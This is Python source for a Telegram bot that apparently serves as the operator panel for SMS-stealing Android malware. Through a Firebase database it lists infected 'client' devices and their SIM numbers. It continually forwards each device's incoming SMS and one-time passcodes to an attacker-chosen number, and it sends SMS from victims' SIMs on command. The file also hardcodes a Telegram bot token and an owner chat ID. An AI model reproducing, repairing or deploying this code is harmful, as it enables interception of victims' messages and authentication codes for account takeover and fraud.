#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE
# ============================
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# ============================
# LOGGING
# ============================
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================
# BOT CONFIG
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8693881841:AAF4BPup1sZpvT5v5TaFl-Yr3DZfXJS8IXU")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8693881841:AAF4BPup1sZpvT5v5TaFl-Yr3DZfXJS8IXU")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "7649997633"))
BOT_NAME = "@AGENTDEEPESH01"
CHANNEL_USERNAME = "@zxdeepyaduvansh"
CHANNEL_URL = "https://t.me/zxdeepyaduvansh"
DEV_SUPPORT = "@anyxpapa"

# ============================
# CONFIG PERSISTENCE
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}
bot_active = {}

def load_user_configs():
    global user_configs, last_otp, bot_active
    if os.path.exists(USER_CONFIG_FILE):
        with open(USER_CONFIG_FILE, "r") as f:
            user_configs = json.load(f)
        for uid, cfg in user_configs.items():
            if "last_otp_value" in cfg:
                last_otp[uid] = cfg["last_otp_value"]
            if "bot_active" in cfg:
                bot_active[uid] = cfg["bot_active"]
            else:
                bot_active[uid] = True
        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
    else:
        user_configs = {}

def save_user_configs():
    for uid in bot_active:
        if uid in user_configs:
            user_configs[uid]["bot_active"] = bot_active.get(uid, True)
    with open(USER_CONFIG_FILE, "w") as f:
        json.dump(user_configs, f, indent=2)

load_user_configs()

# ============================
# STATES
# ============================
(WAITING_FIREBASE_URL, WAITING_OTP_NUMBER, WAITING_CHANNEL_ID) = range(3)

# ============================
# MEMBERSHIP CHECK
# ============================
async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        else:
            await update.message.reply_text(
                f"❌ <b>You must join our channel to use this bot.</b>\n\n"
                f"Join here: {CHANNEL_URL}\n\n"
                f"After joining, send /start again.\n\n"
                f"<b>Support:</b> {DEV_SUPPORT}",
                parse_mode="HTML"
            )
            return False
    except Exception as e:
        logger.error(f"Membership check error: {e}")
        await update.message.reply_text("❌ Error checking membership. Please try later.", parse_mode="HTML")
        return False

# ============================
# HELPER: CREATE CONFIG IF MISSING
# ============================
def ensure_config(user_id):
    if user_id not in user_configs:
        user_configs[user_id] = {
            "firebase_url": None,
            "channel_id": None,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None,
            "bot_active": True,
            "last_otp_value": None
        }
        save_user_configs()

# ============================
# /start COMMAND (Direct Menu)
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    
    await update.message.reply_text(
        f"<b>⚡ {BOT_NAME}</b>\n\n"
        f"<b>✅ Your bot is ready!</b>\n\n"
        f"<b>📌 Available Commands:</b>\n"
        f"/start - Show this menu\n"
        f"/setup - Setup Firebase URL\n"
        f"/addchannel - Add Channel ID\n"
        f"/changechannel - Change Channel ID\n"
        f"/devices - Select Device & SIM\n"
        f"/setsms - Set SMS Forward Number\n"
        f"/resetsms - Reset SMS Forward Number\n"
        f"/status - Check Status\n"
        f"/forcestop - Force Stop (immediate)\n"
        f"/resume - Resume Session\n"
        f"/help - Help Menu\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )

# ============================
# /setup COMMAND
# ============================
async def setup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    await update.message.reply_text(
        f"<b>⚙️ SETUP</b>\n\n"
        f"Send Firebase URL.\n"
        f"Example: <code>https://bhai2-aaelb-default-rtdb.firebaseio.com</code>\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )
    return WAITING_FIREBASE_URL

async def setup_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    url = update.message.text.strip()
    
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("❌ Invalid URL. Send again.", parse_mode="HTML")
        return WAITING_FIREBASE_URL
    
    ensure_config(user_id)
    user_configs[user_id]["firebase_url"] = url
    save_user_configs()
    
    if not user_configs[user_id].get("channel_id"):
        await update.message.reply_text(
            f"✅ Firebase URL saved!\n\n"
            f"Now send Channel ID (numeric, may be negative).\n"
            f"Example: <code>-1001234567890</code>\n\n"
            f"<b>Support:</b> {DEV_SUPPORT}",
            parse_mode="HTML"
        )
        return WAITING_CHANNEL_ID
    else:
        await update.message.reply_text(
            f"✅ Firebase URL saved!\n"
            f"Channel ID already set: <code>{user_configs[user_id]['channel_id']}</code>\n\n"
            f"<b>Support:</b> {DEV_SUPPORT}",
            parse_mode="HTML"
        )
        return ConversationHandler.END

async def setup_channel_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except:
        await update.message.reply_text("❌ Channel ID must be a number. Send again.", parse_mode="HTML")
        return WAITING_CHANNEL_ID
    user_configs[user_id]["channel_id"] = channel_id
    save_user_configs()
    await update.message.reply_text(
        f"✅ Channel ID saved: <code>{channel_id}</code>\n\n"
        f"✅ Setup Complete! Ab aap saare commands use kar sakte ho.\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )
    return ConversationHandler.END

# ============================
# /addchannel COMMAND
# ============================
async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    
    if context.args:
        try:
            channel_id = int(context.args[0])
        except:
            await update.message.reply_text("❌ Invalid Channel ID. Use /addchannel -1001234567890", parse_mode="HTML")
            return ConversationHandler.END
        user_configs[user_id]["channel_id"] = channel_id
        save_user_configs()
        await update.message.reply_text(f"✅ Channel ID saved: <code>{channel_id}</code>", parse_mode="HTML")
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"📢 Send Channel ID (numeric, may be negative).\n"
        f"Example: <code>-1001234567890</code>\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )
    return WAITING_CHANNEL_ID

async def addchannel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except:
        await update.message.reply_text("❌ Channel ID must be a number. Send again.", parse_mode="HTML")
        return WAITING_CHANNEL_ID
    user_configs[user_id]["channel_id"] = channel_id
    save_user_configs()
    await update.message.reply_text(f"✅ Channel ID saved: <code>{channel_id}</code>", parse_mode="HTML")
    return ConversationHandler.END

# ============================
# /changechannel COMMAND
# ============================
async def changechannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    
    if context.args:
        try:
            channel_id = int(context.args[0])
        except:
            await update.message.reply_text("❌ Invalid Channel ID. Use /changechannel -1001234567890", parse_mode="HTML")
            return ConversationHandler.END
        user_configs[user_id]["channel_id"] = channel_id
        save_user_configs()
        await update.message.reply_text(f"✅ Channel ID changed to: <code>{channel_id}</code>", parse_mode="HTML")
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"📢 Send new Channel ID (numeric, may be negative).\n"
        f"Example: <code>-1001234567890</code>\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )
    return WAITING_CHANNEL_ID

async def changechannel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except:
        await update.message.reply_text("❌ Channel ID must be a number. Send again.", parse_mode="HTML")
        return WAITING_CHANNEL_ID
    user_configs[user_id]["channel_id"] = channel_id
    save_user_configs()
    await update.message.reply_text(f"✅ Channel ID changed to: <code>{channel_id}</code>", parse_mode="HTML")
    return ConversationHandler.END

# ============================
# /devices COMMAND (WITH BUTTONS)
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    if not user_configs[user_id].get("firebase_url"):
        await update.message.reply_text("❌ Please run /setup first.", parse_mode="HTML")
        return
    
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("❌ No online devices found.", parse_mode="HTML")
        return
    
    # Create buttons for each device
    keyboard = []
    for dev_id, data in online.items():
        label = f"📱 {data['modelName']} ({dev_id[:10]}...)"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "<b>📱 Select your device:</b>",
        parse_mode="HTML",
        reply_markup=reply_markup
    )

# Callback for device selection
async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode="HTML")
        return
    
    sims = device_data.get("sims", [])
    if not sims:
        await query.edit_message_text("<b>❌ No SIMs on this device.</b>", parse_mode="HTML")
        return
    
    # Create buttons for each SIM
    keyboard = []
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "N/A")
        keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=f"sim_{device_id}_{slot}_{phone}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n"
        f"<b>Choose SIM:</b>",
        parse_mode="HTML",
        reply_markup=reply_markup
    )

# Callback for SIM selection
async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode="HTML")
        return
    
    device_id = parts[1]
    slot = parts[2]
    phone = parts[3]
    
    set_selected(user_id, device_id, slot, phone)
    
    await query.edit_message_text(
        f"✅ <b>Device Selected!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM Slot: <code>{slot}</code>\n"
        f"📞 Phone: <code>{phone}</code>\n\n"
        f"✅ Device selected successfully!\n"
        f"Now set OTP number using /setsms",
        parse_mode="HTML"
    )

# ============================
# /setsms COMMAND
# ============================
async def setsms_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    if not user_configs[user_id].get("firebase_url"):
        await update.message.reply_text("❌ Please run /setup first.", parse_mode="HTML")
        return ConversationHandler.END
    
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("❌ Invalid number. Use /setsms +919876543210", parse_mode="HTML")
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.message.reply_text(f"✅ Forward number set to <code>{number}</code>.", parse_mode="HTML")
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"📞 Send phone number (with country code):\n"
        f"Example: <code>+919876543210</code>\n"
        f"Type /cancel to abort.\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )
    return WAITING_OTP_NUMBER

async def setsms_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("❌ Invalid number. Try again.", parse_mode="HTML")
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"✅ Forward number set to <code>{number}</code>.", parse_mode="HTML")
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("❌ Cancelled.", parse_mode="HTML")
    return ConversationHandler.END

# ============================
# /resetsms COMMAND
# ============================
async def resetsms_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    user_configs[user_id]["otpNumber"] = None
    save_user_configs()
    await update.message.reply_text("✅ SMS Forward number reset. Use /setsms to set a new one.", parse_mode="HTML")

# ============================
# /status COMMAND
# ============================
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    cfg = user_configs[user_id]
    status_text = "🟢 Active" if bot_active.get(user_id, True) else "🔴 Stopped"
    firebase_url = cfg.get("firebase_url", "Not set")
    channel_id = cfg.get("channel_id", "Not set")
    selected = get_selected(user_id)
    device_id = selected.get("deviceId", "Not selected")
    sim_phone = selected.get("simPhoneNumber", "Not selected")
    otp_number = get_otp_number(user_id) or "Not set"
    online_count = len(get_online_devices(user_id))
    await update.message.reply_text(
        f"<b>📊 Status Report</b>\n\n"
        f"<b>Status:</b> {status_text}\n"
        f"<b>Firebase URL:</b> <code>{firebase_url}</code>\n"
        f"<b>Channel ID:</b> <code>{channel_id}</code>\n"
        f"<b>Selected Device:</b> <code>{device_id}</code>\n"
        f"<b>Selected SIM:</b> <code>{sim_phone}</code>\n"
        f"<b>Forward Number:</b> <code>{otp_number}</code>\n"
        f"<b>Online Devices:</b> {online_count}\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )

# ============================
# /forcestop AND /resume COMMANDS
# ============================
async def forcestop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    bot_active[user_id] = False
    user_configs[user_id]["bot_active"] = False
    save_user_configs()
    
    user_configs[user_id]["otpNumber"] = None
    save_user_configs()
    
    await update.message.reply_text(
        f"⛔ <b>FORCE STOP!</b>\n\n"
        f"All forwarding, OTP, and SMS operations have been <b>immediately stopped</b>.\n"
        f"Use /resume to start again.\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )

async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    ensure_config(user_id)
    bot_active[user_id] = True
    user_configs[user_id]["bot_active"] = True
    save_user_configs()
    await update.message.reply_text(
        f"▶️ <b>SESSION RESUMED</b>\n\n"
        f"All forwarding and OTP operations are now active.\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )

# ============================
# /help COMMAND
# ============================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await update.message.reply_text(
        f"<b>⚡ {BOT_NAME} Help Menu</b>\n\n"
        f"<b>📌 Commands:</b>\n"
        f"/start - Show menu\n"
        f"/setup - Setup Firebase URL\n"
        f"/addchannel - Add Channel ID\n"
        f"/changechannel - Change Channel ID\n"
        f"/devices - Select Device & SIM\n"
        f"/setsms - Set SMS Forward Number\n"
        f"/resetsms - Reset SMS Forward Number\n"
        f"/status - Check Status\n"
        f"/forcestop - Force Stop (immediate)\n"
        f"/resume - Resume Session\n"
        f"/help - Help Menu\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    try:
        resp = requests.get(f"{cfg['firebase_url']}/{path}.json", timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
    return None

def firebase_put(user_id, path, data):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return
    try:
        requests.put(f"{cfg['firebase_url']}/{path}.json", json=data, timeout=10)
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")

def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data:
        return {}
    online = {}
    for dev_id, info in data.items():
        if info.get("status") == True:
            online[dev_id] = {"modelName": info.get("modelName", "Unknown"), "sims": info.get("sims", [])}
    return online

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id: str, device_id: str):
    cfg = user_configs.get(user_id)
    if not cfg: return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = list(msgs.keys()) if msgs and isinstance(msgs, dict) else []
    cfg["processed_keys"] = keys
    cfg["processed_device"] = device_id
    save_user_configs()

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {"deviceId": device_id, "simSlotIndex": sim_slot, "simPhoneNumber": sim_phone}
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    return cfg.get("otpNumber") if cfg and "otpNumber" in cfg else None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# SEND SMS + CONFIRMATION
# ============================
def send_sms_with_confirmation(user_id, device_id, to_number, message, from_number, msg_type="SMS"):
    if not bot_active.get(str(user_id), True):
        return False
    firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {"to": to_number, "message": message, "from": from_number, "isSended": False})
    
    confirm_text = ""
    if msg_type == "OTP":
        confirm_text = f"🔐 <b>OTP Auto-Sent!</b>\n\n📱 To: <code>{to_number}</code>\n🔑 OTP: <code>{message}</code>\n📤 From: <code>{from_number}</code>\n✅ <b>Token Send Done!</b>"
    elif msg_type == "INCOMING":
        confirm_text = f"📩 <b>Incoming SMS Forwarded!</b>\n\n📱 To: <code>{to_number}</code>\n💬 Message: <code>{message[:100]}</code>\n📤 From: <code>{from_number}</code>\n✅ <b>Token Send Done!</b>"
    else:
        confirm_text = f"📤 <b>SMS Sent Successfully!</b>\n\n📱 To: <code>{to_number}</code>\n💬 Message: <code>{message[:100]}</code>\n📤 From: <code>{from_number}</code>\n✅ <b>Token Send Done!</b>"
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": int(user_id), "text": confirm_text, "parse_mode": "HTML"}, timeout=5)
        return True
    except Exception as e:
        logger.error(f"Confirmation send error: {e}")
        return False

# ============================
# CHANNEL MESSAGE HANDLER
# ============================
def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post: return
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id: return
    if not bot_active.get(user_id, True): return
    text = update.channel_post.text
    if not text: return
    number_match = re.search(r"To:\s*([\d\+]+)", text)
    message_match = re.search(r"Message:\s*(.+)", text)
    if not number_match or not message_match: return
    to_number = number_match.group(1).strip()
    msg = message_match.group(1).strip()
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": int(user_id), "text": "❌ No device selected! Use /devices", "parse_mode": "HTML"}, timeout=5)
        return
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    send_sms_with_confirmation(user_id, device_id, to_number, msg, from_number, "CHANNEL")

# ============================
# OTP POLLING
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                if not bot_active.get(user_id, True): continue
                otp_number = get_otp_number(user_id)
                if not otp_number: continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"): continue
                try:
                    otp_data = firebase_get(user_id, "otp")
                except:
                    continue
                if otp_data is None: continue
                current_otp = str(otp_data).strip()
                if user_id not in last_otp or last_otp[user_id] != current_otp:
                    last_otp[user_id] = current_otp
                    cfg = user_configs.get(user_id)
                    if cfg:
                        cfg["last_otp_value"] = current_otp
                        save_user_configs()
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_sms_with_confirmation(user_id, device_id, otp_number, current_otp, from_number, "OTP")
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(0.5)

# ============================
# INCOMING MESSAGE FORWARD
# ============================
def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                if not bot_active.get(user_id, True): continue
                forward_number = get_otp_number(user_id)
                if not forward_number: continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"): continue
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                cfg = user_configs.get(str(user_id), {})
                processed_keys = cfg.get("processed_keys", [])
                processed_device = cfg.get("processed_device")
                if processed_device != device_id:
                    initialize_processed_keys(str(user_id), device_id)
                    processed_keys = cfg.get("processed_keys", [])
                processed_set = set(processed_keys)
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict): continue
                new_keys = []
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict): continue
                    if msg_data.get("type") != "incoming": continue
                    if msg_key not in processed_set:
                        msg_text = msg_data.get("message", "")
                        if msg_text and len(msg_text) > 3:
                            send_sms_with_confirmation(user_id, device_id, forward_number, msg_text, from_number, "INCOMING")
                            new_keys.append(msg_key)
                if new_keys:
                    processed_keys.extend(new_keys)
                    cfg["processed_keys"] = processed_keys
                    save_user_configs()
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
        time.sleep(1)

# ============================
# MAIN
# ============================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).build()
    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()
    
    # Setup Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("setup", setup_command)],
        states={
            WAITING_FIREBASE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_firebase_url)],
            WAITING_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel_id)],
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    ))
    
    # Add Channel Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("addchannel", addchannel_command)],
        states={
            WAITING_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, addchannel_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    ))
    
    # Change Channel Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("changechannel", changechannel_command)],
        states={
            WAITING_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, changechannel_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    ))
    
    # Set SMS Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("setsms", setsms_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, setsms_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    ))
    
    # Static Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup_command))
    app.add_handler(CommandHandler("addchannel", addchannel_command))
    app.add_handler(CommandHandler("changechannel", changechannel_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("setsms", setsms_command))
    app.add_handler(CommandHandler("resetsms", resetsms_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("forcestop", forcestop_command))
    app.add_handler(CommandHandler("resume", resume_command))
    app.add_handler(CommandHandler("help", help_command))
    
    # Callback Handlers for buttons
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    
    # Channel Message Handler
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))
    
    logger.info("🤖 Bot started (Full Command Version with Buttons)!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()